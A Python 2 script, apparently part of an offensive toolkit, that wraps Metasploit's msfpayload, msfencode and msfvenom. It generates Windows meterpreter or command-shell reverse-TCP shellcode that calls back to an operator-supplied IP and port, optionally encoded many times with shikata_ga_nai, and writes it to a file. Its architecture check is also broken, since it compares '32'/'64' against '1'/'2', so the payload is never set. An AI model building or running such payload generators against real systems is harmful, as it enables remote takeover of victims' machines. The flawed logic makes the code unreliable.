#!/usr/bin/python
#

import subprocess as subp
import os
from src.core import menus
from src.core.main import *
from time import sleep

while 1:
	try:
		# set msfpath
		path = msfpath()

		# get current dir
		cwd = os.getcwd()

		# interface ip
		iface = iface_ip()

		# select architecture
		# 1 = 32bit
		# 2 = 64bit
		arch = 0
		while arch != range(1,2):
			clear()
			menus.arch_menu()
			selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
			if selection == '1':
				arch = "32"
				break
			elif selection == '2':
				arch = "64"
				break
		
		# select 32bit payload
		if arch == '1':
			selection = 0
			while selection != range(1,2):
				clear()
				menus.shellcode32_menu()
				selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
				if selection == '1':
					payload = "windows/meterpreter/reverse_tcp"
					break
				if selection == '2':
					payload = "windows/shell/reverse_tcp"
					break
					
		if arch == '2':
			PrintInfo("Not yet implemented")
			break

		# shall we encode the payload?
		menus.win_enc_menu()
		encoding = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
	
		#			
		# get some user info
		ip = raw_input("\n Enter your local or remote ip (%s): " % iface)
		if ip == '':
			ip = iface
		port = raw_input(" Enter a port (default 8080): ")
		if not port:
			port = 8080
		if encoding == '1' or encoding == '':
			iterations = raw_input(" Number of times to encode shellcode (default 5): ")
			if not iterations:
				iterations = 5

		# create payload
		#
		# if encoding is 1 then run multi-encoder
		# nothing special just piping through msfencode
		#
		if encoding == '1' or encoding == '':
			PrintInfo("Generating shellcode with x%s shikata_ga_nai. Please wait..." % iterations)
			print ""
			proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c %s -e x86/shikata_ga_nai -t c | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" \
								% (path, payload, ip, port, path, iterations), shell=True, stdout=subp.PIPE)
			
			shellcode = proc.communicate()[0]
			shellcode = shellcode.strip(';')
			sleep(3)
			
			# create windows shellcode file
			winshellcode = "output/shellcode.txt"
			fw = open(winshellcode, "w")
			fw.write(shellcode)
			fw.close()
			sleep(1)
			
			# return to main
			PrintInfo("File shellcode.txt created in output directory")
			EntContinue()
			break
		
		elif encoding == '2':
			PrintInfo("Generating shellcode. Please wait...")
			proc = subp.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s -b '\x00' C | tr -d '\n' | tr -d '+' | tr -d '\"' | tr -d ' ' | sed 's/buf=//'" \
								% (path, payload, ip, port), shell=True, stdout=subp.PIPE)
			
			shellcode = proc.communicate()[0]
			shellcode = shellcode.strip(';')
			shellcode = shellcode.strip('+')
			sleep(3)

			# create windows shellcode file
			winshellcode = "output/shellcode.txt"
			fw = open(winshellcode, "w")
			fw.write(shellcode)
			fw.close()
			sleep(1)

			# return to main
			PrintInfo("File shellcode.txt created in output directory")
			EntContinue()
			break

	except KeyboardInterrupt:
		break
